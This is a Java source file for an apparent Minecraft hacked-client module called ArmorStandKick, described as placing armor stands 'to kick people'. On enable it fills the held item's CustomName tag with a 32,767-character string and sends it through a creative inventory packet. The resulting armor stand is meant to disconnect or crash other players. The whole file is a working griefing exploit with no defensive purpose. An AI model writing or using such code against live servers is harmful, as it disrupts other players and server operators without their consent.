package net.yawk.client.mods.world;

import java.util.List;

import net.minecraft.client.Minecraft;
import net.minecraft.entity.item.EntityArmorStand;
import net.minecraft.entity.player.EntityPlayer;
import net.minecraft.item.ItemStack;
import net.minecraft.nbt.NBTTagCompound;
import net.minecraft.network.play.client.C02PacketUseEntity;
import net.minecraft.network.play.client.C08PacketPlayerBlockPlacement;
import net.minecraft.network.play.client.C10PacketCreativeInventoryAction;
import net.minecraft.util.BlockPos;
import net.minecraft.util.EnumFacing;
import net.minecraft.util.MovingObjectPosition;
import net.minecraft.util.Vec3;
import net.yawk.client.Client;
import net.yawk.client.events.EventRecievePacket;
import net.yawk.client.events.EventSendPacket;
import net.yawk.client.events.EventTick;
import net.yawk.client.modmanager.Mod;
import net.yawk.client.modmanager.ModDetails;
import net.yawk.client.utils.ClientUtils;

import com.darkmagician6.eventapi.EventTarget;

@ModDetails(name = "ArmorStandKick", desc = "Place armor stands to kick people", type = Mod.Type.WORLD)
public class ArmorStandKick extends Mod{
	
	public ArmorStandKick(){
		//TODO: Move this to the exploit pack plugin
	}

	@Override
	public void onEnable() {
		
		ItemStack stack = Client.getClient().getPlayer().getHeldItem();
		
		if(stack != null){
			
			String all = "";
			
			for(int i = 0; i < 32767; i++){
				all += "a";
			}
			
			NBTTagCompound big = new NBTTagCompound();
			big.setInteger("CustomNameVisible", 1);
			big.setString("CustomName", all);
			stack.setTagCompound(big);
			
			ClientUtils.sendPacket(new C10PacketCreativeInventoryAction(36, stack));
		}
	}
	
	@Override
	public void onDisable() {
		
	}
}
